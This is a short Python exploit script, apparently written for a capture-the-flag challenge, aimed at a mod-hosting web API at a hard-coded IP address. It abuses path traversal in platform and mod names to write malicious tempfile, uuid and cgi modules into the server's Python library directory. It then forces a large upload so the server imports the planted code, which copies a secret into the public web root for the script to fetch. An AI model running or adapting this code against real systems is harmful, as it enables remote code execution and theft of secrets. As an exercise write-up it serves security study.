import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

# plant tempfile + uuid in stdlib, then do large upload
tok,u=fresh()
for m,mk in [("tempfile","zf_temp"),("uuid","zf_uuid"),("cgi","zf_cgi")]:
    mal=f'import os\nopen("/usr/share/nginx/html/{mk}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    pid=pf.create_platform(tok,"lib/python3.11",name="z"); mid=pf.create_mod(tok,"../../../usr/local",title="z"); bid=pf.create_build(tok,mid,pid)
    pf.upload_zip(tok,mid,bid,{m+".py":mal})
# large upload -> TemporaryFileUploadHandler
pid=pf.create_platform(tok,"t%d"%random.randint(0,9999),name="z"); mid=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid=pf.create_build(tok,mid,pid)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("big.bin", b"A"*(8*1024*1024))
bio.seek(0)
r=requests.post(f"{BASE}/api/mods/%d/builds/%d/upload/"%(mid,bid),headers={"Authorization":f"Bearer {tok}"},files={"zip_file":("p.zip",bio,"application/zip")},timeout=40)
print("large upload ->", r.status_code, r.text[:60])
time.sleep(1)
for mk in ["zf_temp","zf_uuid","zf_cgi"]:
    c=requests.get(f"{BASE}/{mk}",timeout=6)
    print(mk, c.status_code, repr(c.content[:40]))
